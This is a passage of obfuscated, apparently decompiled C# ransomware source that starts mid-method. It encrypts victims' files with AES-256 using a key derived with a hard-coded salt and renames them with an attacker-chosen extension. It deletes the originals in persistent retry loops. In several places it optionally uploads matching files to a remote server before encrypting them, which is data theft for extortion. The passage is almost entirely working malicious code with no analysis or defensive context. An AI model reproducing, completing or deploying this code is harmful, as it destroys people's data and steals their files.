							catch (Exception ex6)
							{
								if (bZJnUpHOpIgqq)
								{
									try
									{
										File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								SysSpLHfXXw++;
								return;
							}
							if (GOYptZKYZHsrv != ".*")
							{
								fileInfo += GOYptZKYZHsrv;
							}
							if (wrHvZpAvrSgJW == "YES")
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in sSiWAwlCjtk)
									{
										if (fileInfo.ToLower().EndsWith(item3 + GOYptZKYZHsrv) && LmSFIAUjDvp == "YES")
										{
											if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > new FileInfo(fileInfo).Length)
											{
												try
												{
													hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", fileInfo);
												}
												catch
												{
												}
											}
										}
										else if (fileInfo.ToLower().EndsWith(item3) && LmSFIAUjDvp == "NO")
										{
											try
											{
												hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = OAYXVHDzPgdFHv.XHZvUIhBlcoaY(32);
							string text2 = "";
							text2 = (QHRYFfpHvmAnP ? OAYXVHDzPgdFHv.WsldrQcqYAlmUzOPt() : "");
							string s = DDUEkMsefa.PFPBRyzXpmMZne(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (DeTwNBVFGbT == "NO")
							{
								byte[] array2 = null;
								byte[] array3 = rXGCpkRzmuovpDl.ixVmRqpXGZeT(fileInfo, Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024);
								if (!rXGCpkRzmuovpDl.lXlBZHvZpzmZ(hNucWYcpei: (!WSwhVqfGVa) ? (QHRYFfpHvmAnP ? rXGCpkRzmuovpDl.iCldzZsGXm(array3, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rXGCpkRzmuovpDl.iCldzZsGXm(array3, Convert.FromBase64String(ueQsZaJdyQzNRH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (QHRYFfpHvmAnP ? mZsSeBuSvlPmJ.voShjptzjbTK(array3, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : mZsSeBuSvlPmJ.voShjptzjbTK(array3, Convert.FromBase64String(ueQsZaJdyQzNRH), Convert.FromBase64String(yWaizfdbSvLTf))), gxtHysuevYkPA: fileInfo, kefvkXQNqnLAH: bytes))
								{
									try
									{
										File.Move(fileInfo + GOYptZKYZHsrv, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!QHRYFfpHvmAnP)
							{
								if (!CZBAZmhlcpldk.jkBoTormCTqbO(fileInfo, OonNbDeTktyi, ueQsZaJdyQzNRH, null, Convert.FromBase64String(yWaizfdbSvLTf)))
								{
									try
									{
										File.Move(fileInfo + GOYptZKYZHsrv, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!CZBAZmhlcpldk.jkBoTormCTqbO(fileInfo, OonNbDeTktyi, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(fileInfo + GOYptZKYZHsrv, fileInfo);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (ZKQhNlGAfwnU)
							{
								GOYptZKYZHsrv = qoCjIwmYfANN + GOYptZKYZHsrv;
							}
							string text3 = OAYXVHDzPgdFHv.XHZvUIhBlcoaY(32);
							string text4 = "";
							text4 = (QHRYFfpHvmAnP ? OAYXVHDzPgdFHv.WsldrQcqYAlmUzOPt() : "");
							string s2 = DDUEkMsefa.PFPBRyzXpmMZne(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (GOYptZKYZHsrv != ".*")
							{
								if (!SgwcaMaFwGfR)
								{
									if (!QHRYFfpHvmAnP)
									{
										ohAjzLYTnRJd(fileInfo, fileInfo + GOYptZKYZHsrv, cGCyjVdvSXL);
									}
									else
									{
										ohAjzLYTnRJd(fileInfo, fileInfo + GOYptZKYZHsrv, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!QHRYFfpHvmAnP)
										{
											TloNjDlLdEBIQ(fileInfo, fileInfo + GOYptZKYZHsrv, cGCyjVdvSXL, Convert.FromBase64String(yWaizfdbSvLTf));
										}
										else
										{
											TloNjDlLdEBIQ(fileInfo, fileInfo + GOYptZKYZHsrv, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (bZJnUpHOpIgqq)
										{
											try
											{
												File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while fully writing to file: " + ex11.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										SysSpLHfXXw++;
										try
										{
											File.Move(fileInfo + GOYptZKYZHsrv, fileInfo);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!SgwcaMaFwGfR)
							{
								if (!QHRYFfpHvmAnP)
								{
									ohAjzLYTnRJd(fileInfo, fileInfo + ".part", cGCyjVdvSXL);
								}
								else
								{
									ohAjzLYTnRJd(fileInfo, fileInfo + ".part", Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!QHRYFfpHvmAnP)
									{
										TloNjDlLdEBIQ(fileInfo, fileInfo, cGCyjVdvSXL, Convert.FromBase64String(yWaizfdbSvLTf));
									}
									else
									{
										TloNjDlLdEBIQ(fileInfo, fileInfo, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (bZJnUpHOpIgqq)
									{
										try
										{
											File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while fully writing to file: " + ex14.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									SysSpLHfXXw++;
									return;
								}
							}
							if (QHRYFfpHvmAnP)
							{
								if (GOYptZKYZHsrv != ".*")
								{
									cjxIyyVHKHrvDrL(fileInfo + GOYptZKYZHsrv, bytes2);
								}
								else
								{
									cjxIyyVHKHrvDrL(fileInfo, bytes2);
								}
							}
						}
						end_IL_0651_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d5b;
			IL_0d5b:
			LKTvVLBvXWAY.Remove(fileInfo);
		});
	}

	private static void keoXVIredpqFC(string fFBWhniwCrXPOsFP, string rPEgNWIIxQVj, byte[] ZHGnDSqoFaR)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(rPEgNWIIxQVj, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(ZHGnDSqoFaR, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(fFBWhniwCrXPOsFP, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (rPEgNWIIxQVj.Length > 0)
				{
					FileStream fileStream3 = new FileStream(fFBWhniwCrXPOsFP, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (wrHvZpAvrSgJW == "YES")
					{
						foreach (string item in sSiWAwlCjtk)
						{
							if (fFBWhniwCrXPOsFP.ToLower().EndsWith(item) && LmSFIAUjDvp == "YES")
							{
								if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", fFBWhniwCrXPOsFP);
									}
									catch
									{
									}
								}
							}
							else if (fFBWhniwCrXPOsFP.ToLower().EndsWith(item) && LmSFIAUjDvp == "NO")
							{
								try
								{
									hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", fFBWhniwCrXPOsFP);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(fFBWhniwCrXPOsFP) && num2 >= 0)
							{
								File.Delete(fFBWhniwCrXPOsFP);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (rPEgNWIIxQVj.EndsWith(".part"))
					{
						File.Move(rPEgNWIIxQVj, rPEgNWIIxQVj.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(rPEgNWIIxQVj);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void TloNjDlLdEBIQ(string puZDZTHJOOhDt, string IpvzlHKgDFi, byte[] NKFiFDEnmMsca, byte[] qkNoKgmwqQhm = null)
	{
		try
		{
			if (wrHvZpAvrSgJW == "YES")
			{
				FileStream fileStream = new FileStream(puZDZTHJOOhDt, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in sSiWAwlCjtk)
				{
					if (puZDZTHJOOhDt.ToLower().EndsWith(item) && LmSFIAUjDvp == "YES")
					{
						if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", puZDZTHJOOhDt);
							}
							catch
							{
							}
						}
					}
					else if (puZDZTHJOOhDt.ToLower().EndsWith(item) && LmSFIAUjDvp == "NO")
					{
						try
						{
							hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", puZDZTHJOOhDt);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (puZDZTHJOOhDt != IpvzlHKgDFi)
		{
			File.Move(puZDZTHJOOhDt, IpvzlHKgDFi);
			puZDZTHJOOhDt = IpvzlHKgDFi;
		}
		byte[] bytes = mZsSeBuSvlPmJ.voShjptzjbTK(File.ReadAllBytes(puZDZTHJOOhDt), NKFiFDEnmMsca, qkNoKgmwqQhm);
		File.WriteAllBytes(puZDZTHJOOhDt, bytes);
		lerIQIfDMA++;
	}

	private static void ohAjzLYTnRJd(string xPUJCLyRLtYjlUr, string vggmxlBWmdl, byte[] scXyqiDJjxiSsn)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = vggmxlBWmdl;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(scXyqiDJjxiSsn, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (plYUDCqFaSkhDF == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(xPUJCLyRLtYjlUr, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(xPUJCLyRLtYjlUr, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(xPUJCLyRLtYjlUr, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (vggmxlBWmdl.Length > 0)
				{
					if (wrHvZpAvrSgJW == "YES")
					{
						FileStream fileStream4 = new FileStream(xPUJCLyRLtYjlUr, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in sSiWAwlCjtk)
						{
							if (xPUJCLyRLtYjlUr.ToLower().EndsWith(item) && LmSFIAUjDvp == "YES")
							{
								if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", xPUJCLyRLtYjlUr);
									}
									catch
									{
									}
								}
							}
							else if (xPUJCLyRLtYjlUr.ToLower().EndsWith(item) && LmSFIAUjDvp == "NO")
							{
								try
								{
									hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", xPUJCLyRLtYjlUr);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(xPUJCLyRLtYjlUr);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (vggmxlBWmdl.EndsWith(".part"))
					{
						File.Move(vggmxlBWmdl, vggmxlBWmdl.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(vggmxlBWmdl))
							{
								File.Delete(vggmxlBWmdl);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(SlCyjezmzcjRF, "File: " + xPUJCLyRLtYjlUr + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
